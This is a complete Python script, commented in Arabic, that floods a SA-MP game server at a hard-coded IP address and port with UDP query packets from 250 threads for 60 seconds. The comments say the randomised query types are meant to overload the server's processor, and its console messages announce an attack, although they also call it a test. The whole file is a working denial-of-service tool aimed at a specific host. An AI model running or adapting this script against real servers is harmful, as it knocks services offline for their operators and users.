import socket
import time
import threading
import random

# =====================================================================
# === TRAPKING SAMP SMART QUERY STRESSOR (Advanced Edition) ===
# =====================================================================

TARGET_IP = "89.46.1.130"  # الـ IP المستهدف (أو 89.46.1.130)
TARGET_PORT = 7008            # البورت المستهدف (مثلاً 7777 أو 7008)
DURATION = 60                 # مدة الاختبار بالثواني
THREADS_COUNT = 250           # عدد الخيوط لاستغلال Ryzen 9

# أنواع طلبات الاستعلام الحقيقية الخاصة ببروتوكول SA-MP لإرباك معالج السيرفر
# 'i' = Info, 'c' = Clients, 'r' = Rules, 'd' = Details
QUERY_TYPES = [b'i', b'c', b'r', b'd']

def generate_samp_payload(ip_str, port_int):
    try:
        # بناء ترويسة استعلام SA-MP أصلية وصحيحة تقنياً
        ip_bytes = socket.inet_aton(ip_str)
        port_bytes = int(port_int).to_bytes(2, 'little')
        q_type = random.choice(QUERY_TYPES)
        # هيكل حزمة الاستعلام: 'S' 'A' 'M' 'P' + IP + Port + Query Type
        return b'SAMP' + ip_bytes + port_bytes + q_type
    except:
        return b'SAMP'

def attack_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + DURATION
    
    payload = generate_samp_payload(TARGET_IP, TARGET_PORT)
    
    while time.time() < end_time:
        try:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass
            
    client.close()

def main():
    print(f"[*] بدء الهجوم الذكي والمطور على سيرفر SA-MP: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] استخدام {THREADS_COUNT} خيط عبر الـ VPS وبث طلبات استعلام حقيقية...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت عملية الاختبار بنجاح.")

if __name__ == "__main__":
    main()
